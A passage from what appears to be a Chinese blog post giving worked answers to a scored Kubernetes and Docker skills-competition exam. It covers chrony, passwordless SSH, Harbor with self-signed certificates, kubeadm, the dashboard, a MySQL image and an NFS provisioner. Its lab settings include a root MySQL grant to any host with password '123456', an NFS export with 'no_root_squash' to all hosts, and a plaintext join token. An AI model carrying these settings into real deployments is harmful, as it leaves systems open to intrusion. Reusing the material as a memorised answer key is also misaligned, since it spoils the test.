<span class="built_in">source</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">local</span> stratum 10</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify file containing keys <span class="keyword">for</span> NTP authentication.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">keyfile /etc/chrony.keys</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify directory <span class="keyword">for</span> <span class="built_in">log</span> files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Select <span class="built_in">which</span> information is logged.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">log</span> measurements statistics tracking</span></span><br><span class="line">allow 10.0.0.0/24</span><br><span class="line">local stratum 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl enable chronyd</span><br></pre></td></tr></table></figure>

<p><strong>其他节点</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Record the rate at <span class="built_in">which</span> the system clock gains/losses <span class="keyword">time</span>.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow the system clock to be stepped <span class="keyword">in</span> the first three updates</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hwtimestamp *</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the system clock.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">minsources 2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow NTP client access from <span class="built_in">local</span> network.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">allow 192.168.0.0/16</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Serve <span class="keyword">time</span> even <span class="keyword">if</span> not synchronized to a <span class="keyword">time</span> <span class="built_in">source</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">local</span> stratum 10</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify file containing keys <span class="keyword">for</span> NTP authentication.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">keyfile /etc/chrony.keys</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Specify directory <span class="keyword">for</span> <span class="built_in">log</span> files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Select <span class="built_in">which</span> information is logged.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">log</span> measurements statistics tracking</span></span><br><span class="line"></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl enable chronyd</span><br></pre></td></tr></table></figure>

<h3 id="5-设置免密登录"><a href="#5-设置免密登录" class="headerlink" title="5.设置免密登录"></a>5.设置免密登录</h3><p>为四台服务器设置免密登录，保证 3 台服务器能够互相免密登录。请使用 scp 命令将 master 节点的 hosts 文件发送到所有节点的 &#x2F;etc&#x2F;hosts。将以上所有命令和返回结果提交到答题框。【1 分】</p>
<p><strong>Master</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen </span><br><span class="line">ssh-copy-id root@10.0.0.2</span><br><span class="line">ssh-copy-id root@10.0.0.3</span><br><span class="line">ssh-copy-id root@10.0.0.4</span><br><span class="line"></span><br><span class="line">scp /etc/hosts root@10.0.0.2:/etc/hosts</span><br><span class="line">scp /etc/hosts root@10.0.0.3:/etc/hosts</span><br><span class="line">scp /etc/hosts root@10.0.0.4:/etc/hosts</span><br></pre></td></tr></table></figure>

<h2 id="任务-2-Kubernetes-搭建任务（10-分）"><a href="#任务-2-Kubernetes-搭建任务（10-分）" class="headerlink" title="任务 2 Kubernetes 搭建任务（10 分）"></a><strong>任务 2 Kubernetes 搭建任务（10 分）</strong></h2><h3 id="1-安装docker应用"><a href="#1-安装docker应用" class="headerlink" title="1.安装docker应用"></a>1.安装docker应用</h3><p>在所有节点上安装 dokcer-ce。并在 harbor 节点安装 harbor 仓库，显现正常登录 horbor 仓库，登录密码设置为“test_工位号”。请将登录后截图提交到 </p>
<p>答题框。【1 分】 </p>
<p><strong>所有节点</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装依赖</span></span><br><span class="line">yum install -y yum-utils lvm2 device-mapper-*</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装docker-ce</span></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"></span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>

<p><strong>Harbor</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装docker-compose</span></span><br><span class="line"></span><br><span class="line">cp -rfv /opt/docker-compose/v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose version</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装harbor</span></span><br><span class="line">tar -zxvf harbor-offline-installer-v2.1.0.tgz</span><br><span class="line">cd harbor</span><br><span class="line">cp harbor.yml.tmpl harbor.yml</span><br><span class="line"></span><br><span class="line">vi harbor.yml </span><br><span class="line">  hostname: 10.0.0.4 # 将域名修改为本机IP</span><br><span class="line">  harbor_admin_password: test_31</span><br><span class="line">./prepare</span><br><span class="line">./install.sh --with-clair</span><br></pre></td></tr></table></figure>

<h3 id="2-搭建harbor仓库"><a href="#2-搭建harbor仓库" class="headerlink" title="2.搭建harbor仓库"></a>2.搭建harbor仓库</h3><p>修改默认 docker 仓库为 horbor 地址，修改 docker 启动引擎为 systemd。安装完成后执行 docker verison 命令返回结果以及将 daemon.json 文件内容提交。【2 分】</p>
<p>所有节点</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;insecure-registries&quot;</span> : [<span class="string">&quot;10.0.0.4:5000&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exec-opts&quot;</span>: [<span class="string">&quot;native.cgroupdriver=systemd&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>

<h3 id="3-安装-docker-compose"><a href="#3-安装-docker-compose" class="headerlink" title="3.安装 docker-compose"></a>3.安装 docker-compose</h3><p>在 master 节点上使用 &#x2F;opt&#x2F;paas&#x2F;docker-compose&#x2F;v1.25.5-docker-compose-Linux-x86_6 下的文件安装 docker-compose。安装完成后执行 docker-compose version 命令，请将程序返回结果提交到答题框。【0.5 分】</p>
<p><strong>Master</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -rfv /opt/docker-compose/v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose version</span><br></pre></td></tr></table></figure>

<h3 id="4-上传docker镜像"><a href="#4-上传docker镜像" class="headerlink" title="4.上传docker镜像"></a>4.上传docker镜像</h3><p>在 master 节点使用 &#x2F;opt&#x2F;paas&#x2F; k8s_image_push.sh 将所有镜像上传至 docker 仓库。完成后将 Harbor 仓库 library 中镜像列表截图，请将以上截图提交到答题框。【1 分】</p>
<p><strong>①.创建CA证书</strong>（harbor）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /cert/ -p</span><br><span class="line"><span class="built_in">cd</span> /cert/ </span><br><span class="line"><span class="comment">#以下命令创建ca证书</span></span><br><span class="line">openssl req  -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 365 -out ca.crt</span><br><span class="line"><span class="comment">#一路回车出现Common Name 输入IP或域名</span></span><br><span class="line">Common Name (eg, your name or your server<span class="string">&#x27;s hostname) []:10.0.0.4</span></span><br></pre></td></tr></table></figure>

<p><strong>②.生成证书签名请求</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openssl req  -newkey rsa:4096 -nodes -sha256 -keyout 10.0.0.4.key -out 10.0.0.4.csr</span><br><span class="line">一路回车出现Common Name 输入IP或域名</span><br><span class="line">Common Name (eg, your name or your server<span class="string">&#x27;s hostname) []:10.0.0.4</span></span><br></pre></td></tr></table></figure>

<p><strong>③生成证书</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> subjectAltName = IP:10.0.0.4 &gt; extfile.cnf</span><br><span class="line">openssl x509 -req -days 365 -<span class="keyword">in</span> 10.0.0.4.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile extfile.cnf -out 10.0.0.4.crt</span><br></pre></td></tr></table></figure>

<p><strong>④配置harbor.yml</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -zxvf harbor-offline-installer-v2.0.1.tgz</span><br><span class="line"><span class="built_in">cd</span> harbor</span><br><span class="line"><span class="built_in">cp</span> harbor.yml.tmpl harbor.yml</span><br><span class="line">hostname=10.0.0.4</span><br><span class="line">ssl_cert = /cert/10.0.0.4.crt     <span class="comment">#crt位置</span></span><br><span class="line">ssl_cert_key = /cert/10.0.0.4.key  <span class="comment">#key的位置     </span></span><br></pre></td></tr></table></figure>

<p><strong>⑤配置使用harbor</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./prepare</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>

<p><strong>因为是自签证书需要添加到信任</strong></p>
<p>每一个客户端都需要复制上面的ca.crt到Docker相应目录，然后重启Docker。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir –p /etc/docker/certs.d/10.0.0.4</span><br><span class="line">cp ca.crt /etc/docker/certs.d/10.0.0.4/ca.crt</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在使用k8s_image_pull.sh可能不成功</span></span><br><span class="line">原因一：前面的k8s_harbor_install中有一个命令未使用</span><br><span class="line"> for i in $(ls /opt/images|grep tar); do   docker load -i /opt/images/$i </span><br><span class="line"> done</span><br><span class="line"> 原因二：目录不正确，需要更改目录 /opt（按题目叙述）</span><br></pre></td></tr></table></figure>

<h3 id="5-安装-kubeadm-工具"><a href="#5-安装-kubeadm-工具" class="headerlink" title="5.安装 kubeadm 工具"></a>5.安装 kubeadm 工具</h3><p>在 master 及 node 节点安装 Kubeadm 工具并设置开机自动启动，安装完成后使用 rpm 命令配合 grep 查看 Kubeadm 工具是否正确安装。</p>
<p>将 rpm 命令配合 grep返回结果提交到答题框。【0.5 分】 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install kubeadm-1.18.1 kubectl-1.18.1 kubelet-1.18.1</span><br><span class="line"></span><br><span class="line">systemctl enable kubelet &amp;&amp; systemctl start kubelet</span><br><span class="line"> </span><br><span class="line"> rpm -qa | grep ku</span><br></pre></td></tr></table></figure>

<h3 id="6-计算节点获取必备镜像"><a href="#6-计算节点获取必备镜像" class="headerlink" title="6.计算节点获取必备镜像"></a>6.计算节点获取必备镜像</h3><p>在所有 node 节点中使用 docker 命令拉取安装 kubernetes 基础镜像，拉取完成后使用 docker 命令查看镜像列表。【1 分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ...</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>

<h3 id="7-kubeadm-安装-master"><a href="#7-kubeadm-安装-master" class="headerlink" title="7.kubeadm 安装 master"></a>7.kubeadm 安装 master</h3><p>使用 kubeadm 命令初始化 master 节点，设置 kubernetes 虚拟内部网段地址为 10.244.0.0&#x2F;16，然后使用 kube-flannel.yaml 完成控制节点初始化设置，完成后使用命令查看集群状态和所有 pod。 </p>
<p>将以上命令和返回结果提交到答题框。【2 分】</p>
<p><strong>master</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启路由转发</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; /etc/sysctl.d/k8s.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">net.ipv4.ip_forward = 1 </span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1 </span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1 </span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">sysctl --system  //生效</span><br><span class="line"><span class="comment">#初始化</span></span><br><span class="line">kubeadm init --apiserver-advertise-address=192.168.200.162 --kubernetes-version=<span class="string">&quot;v1.18.0&quot;</span> --pod-network-cidr=10.244.0.0/16 --image-repository=registry.aliyuncs.com/google_containers --service-cidr=10.96.0.0/12</span><br><span class="line"></span><br><span class="line"><span class="comment">#部署网络</span></span><br><span class="line"> kubectl apply -f kube-flannel.yaml</span><br><span class="line"> </span><br><span class="line"><span class="comment">#查看状态</span></span><br><span class="line">kubectl get pod -A</span><br><span class="line">kubectl get cs</span><br></pre></td></tr></table></figure>

<h3 id="8-安装-kubernetes-网络插件"><a href="#8-安装-kubernetes-网络插件" class="headerlink" title="8.安装 kubernetes 网络插件"></a>8.安装 kubernetes 网络插件</h3><p>使用 kube-flannel.yaml 安装 kubernetes 网络插件，安装完成后使用命令查看节点状态。完成后使用命令查看集群状态。将集群状态查看命令和返回结果 </p>
<p>提交到答题框。【0.5 分】 </p>
<h3 id="9-kubernetes-图形化界面的安装"><a href="#9-kubernetes-图形化界面的安装" class="headerlink" title="9.kubernetes 图形化界面的安装"></a>9.kubernetes 图形化界面的安装</h3><p>安装 kubernetes dashboard 界面，完成后查看首页然后将 kubernetes dashboard 界面截图提交到答题框。【1 分】 </p>
<p><strong>①创建证书</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir dashboard-certs</span><br><span class="line">cd dashboard-certs/</span><br><span class="line"></span><br><span class="line">kubectl create namespace kubernetes-dashboard</span><br><span class="line">openssl genrsa -out dashboard.key 2048</span><br><span class="line">openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj &#x27;/CN=dashboard-cert&#x27;</span><br><span class="line">openssl x509 -req -in dashboard.csr -signkey dashboard.key -out dashboard.crt</span><br><span class="line">kubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>

<p><strong>②安装dashboard</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f recommended.yaml </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看状态</span></span><br><span class="line">kubectl get pod,svc -n kubernetes-dashboard</span><br><span class="line"></span><br><span class="line"> kubectl apply -f dashboard-adminuser.yaml </span><br></pre></td></tr></table></figure>

<p><strong>访问dashboard（<a href="https://IP:30000）">https://IP:30000）</a></strong></p>
<p>获取<strong>token</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kuebctl get secret -n kubernetes-dashboard</span><br><span class="line">kubectl describe secret -n kubernetes-dashboard &lt;sec名称&gt;</span><br></pre></td></tr></table></figure>

<h3 id="10-扩展计算节点"><a href="#10-扩展计算节点" class="headerlink" title="10.扩展计算节点"></a>10.扩展计算节点</h3><p>在 master 节点上使用 kubeadm 命令查看 token，在所有 node 节点上使用 kubeadm 命令将 node 节点加入 kubernetes 集群。完成后在 master 节点上查看所有节点状态。将集群状态查看命令和返回结果提交到答题框。【0.5 分】</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看token</span></span><br><span class="line">kubeadm token list</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看--discovery-token-ca-cert-hash值</span></span><br><span class="line">openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2&gt;/dev/null | openssl dgst -sha256 -hex | sed &#x27;s/^.* //&#x27;</span><br><span class="line"></span><br><span class="line">kubeadm join 192.168.200.162:6443 --token qi3pfd.mv5s93kio6jb4m7s \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:c559bb4420ee1e071655498290a39fd4e0a0126c239b3be7cb1065b5b9f971d5</span><br></pre></td></tr></table></figure>

<h2 id="任务-3-Kubernetes-运维任务（15-分）"><a href="#任务-3-Kubernetes-运维任务（15-分）" class="headerlink" title="任务 3 Kubernetes 运维任务（15 分）"></a><strong>任务 3 Kubernetes 运维任务（15 分）</strong></h2><h3 id="1-使用-dockerfile-构建-dokcer-镜像"><a href="#1-使用-dockerfile-构建-dokcer-镜像" class="headerlink" title="1.使用 dockerfile 构建 dokcer 镜像"></a>1.使用 dockerfile 构建 dokcer 镜像</h3><p>以 mysql:5.7 镜像为基础镜像，制作一个 mysql 镜像，可以将提供的 sql 文件初始化到 mysql 数据库中，然后使用编写的 dockerfile 文件将镜像制作出来，名称为 mysql:latest，并将该镜像上传至前面所搭建的 harbor 仓库中，编写 YAML 文件，验证数据库内容。</p>
<p><strong>master</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi Dockerfile</span><br><span class="line"></span><br><span class="line">FROM mysql:5.7</span><br><span class="line">MAINTAINER ywj</span><br><span class="line">WORKDIR /docker-entrypoint-initdb.d</span><br><span class="line">ENV MYSQL_ROOT_PASSWORD=123456</span><br><span class="line">COPY gpmall.sql /opt/sql/</span><br><span class="line">COPY init.sql /docker-entrypoint-initdb.d/                                  </span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">init.sql</span><br><span class="line"></span><br><span class="line">grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line">create database gpmall default character set=utf8;</span><br><span class="line">use gpmall;</span><br><span class="line">source /opt/sql/gpmall.sql;</span><br></pre></td></tr></table></figure>

<p><strong>将sql文件放在本目录中</strong></p>
<h3 id="2-持久化存储"><a href="#2-持久化存储" class="headerlink" title="2.持久化存储"></a>2.持久化存储</h3><p>搭建 NFS 共享存储，配置 nfs-provisioner，创建 storageclass，通过 storageclass 动态生成 pvc，大小为 1Gi，修改标准 nfs-deployment.yaml 文件，编写 storageclass.yaml 和 pvc.yaml 文件，将最终 pvc 状态截图和 yaml 文件提 </p>
<p>交至答题框。【2 分】</p>
<p><strong>部署流程</strong></p>
<ol>
<li><strong>创建一个可用的NFS Server</strong></li>
<li><strong>创建Service Account，这是用来管控NFS Provisioner 在k8s集群中运行的权限</strong></li>
<li><strong>创建StorageClass，负责建立PVC并调用NFS provisioner进行预定的工作，并让PV与PVC建立关联</strong></li>
<li><strong>创建NFS provisioner，有两个功能，一个是在NFS共享目录下创建挂载点(volume)，另一个则是建了PV并将PV与NFS的挂载点建立关联</strong></li>
</ol>
<p><strong>安装nfs-server,并完成配置</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install -y nfs-utils rpcbind </span><br><span class="line"><span class="comment">#其它node节点</span></span><br><span class="line">yum install -y nfs-utils(不要启动)</span><br><span class="line"></span><br><span class="line">vi /etc/exports</span><br><span class="line">/nfsdata *(rw,<span class="built_in">sync</span>,no_root_squash,no_subtree_check)</span><br><span class="line">systemctl start nfs-server rpcbind</span><br><span class="line">systemctl <span class="built_in">enable</span> nfs-server rpcbind</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看是否就绪</span></span><br><span class="line">showmount -e</span><br></pre></td></tr></table></figure>

<p><strong>编写serviceaccount.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">demo</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-client-provisioner-runner</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;nodes&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;persistentvolumes&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;delete&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;persistentvolumeclaims&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;update&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;storage.k8s.io&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;storageclasses&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;events&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;patch&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">run-nfs-client-provisioner</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">demo</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-client-provisioner-runner</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">leader-locking-nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">demo</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;endpoints&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;patch&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">leader-locking-nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">demo</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">demo</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">leader-locking-nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure>

<p><strong>编写stroageclass.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">storage.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">StorageClass</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">managed-nfs-storage</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">storageclass.kubernetes.io/is-default-class:</span> <span class="string">&quot;true&quot;</span>  <span class="comment"># 是否设置为默认的storageclass</span></span><br><span class="line"><span class="attr">provisioner:</span> <span class="string">k8s/nfs-subdir-external-provisioner</span> <span class="comment"># or choose another name, must match deployment&#x27;s env PROVISIONER_NAME&#x27;</span></span><br><span class="line"><span class="attr">allowVolumeExpansion:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">parameters:</span></span><br><span class="line">  <span class="attr">archiveOnDelete:</span> <span class="string">&quot;false&quot;</span> <span class="comment"># 设置为&quot;false&quot;时删除PVC不会保留数据,&quot;true&quot;则保留数据</span></span><br></pre></td></tr></table></figure>

<p><strong>编写nfs-deployment.yaml</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">strategy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">Recreate</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">  <span 